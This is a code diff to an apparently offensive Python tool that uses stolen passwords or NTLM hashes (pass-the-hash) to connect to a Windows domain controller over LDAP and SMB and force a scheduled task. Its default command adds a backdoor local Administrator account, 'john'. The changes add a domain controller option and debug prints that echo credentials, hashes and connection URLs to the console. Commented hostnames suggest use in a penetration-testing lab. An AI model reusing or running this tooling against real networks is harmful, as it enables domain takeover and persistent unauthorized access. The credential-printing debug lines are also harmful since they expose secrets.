@@ -31,6 +31,7 @@ parser.add_argument('-command', action='store',
                     help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
 parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
 parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
+parser.add_argument('-dc_ip_or_fqdn', action='store', help='Domain Controller. (Default: Domain.com)')
 
 if len(sys.argv) == 1:
     parser.print_help()
@@ -73,14 +74,19 @@ elif options.hashes is not None:
         logging.error("Wrong hash format. Expecting lm:nt")
         sys.exit(1)
 
-dc_ip = domain
+print ("DCIP: ", options.dc_ip_or_fqdn)
+
+#dc_ip = domain
+dc_ip = options.dc_ip_or_fqdn
+
 if password != '':
     url = 'ldap+ntlm-password://{}\\{}:{}@{}'.format(domain, username, password, address)
     lmhash, nthash = "",""
+    print ("DEBUG using password: ", username, password, domain, lmhash, nthash, dc_ip, url)
 else:
     url = 'ldap+ntlm-nt://{}\\{}:{}@{}'.format(domain, username, options.hashes.split(":")[1], address)
     lmhash, nthash = options.hashes.split(":")
-
+    print ("DEBUG using HASH: ", username, password, domain, lmhash, nthash, dc_ip, url)
 
 def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
     try:
@@ -92,6 +98,9 @@ def get_session(address, target_ip="", username="", password="", lmhash="", ntha
         return False
 
 try:
+#    dc_ip = 'dc01.rastalabs.local'
+#    domain = 'rastalabs.local'
+    print ("DEBUG SMB: ", domain, dc_ip)
     smb_session = SMBConnection(dc_ip, dc_ip)
     smb_session.login(username, password, domain, lmhash, nthash)
 except Exception as e:
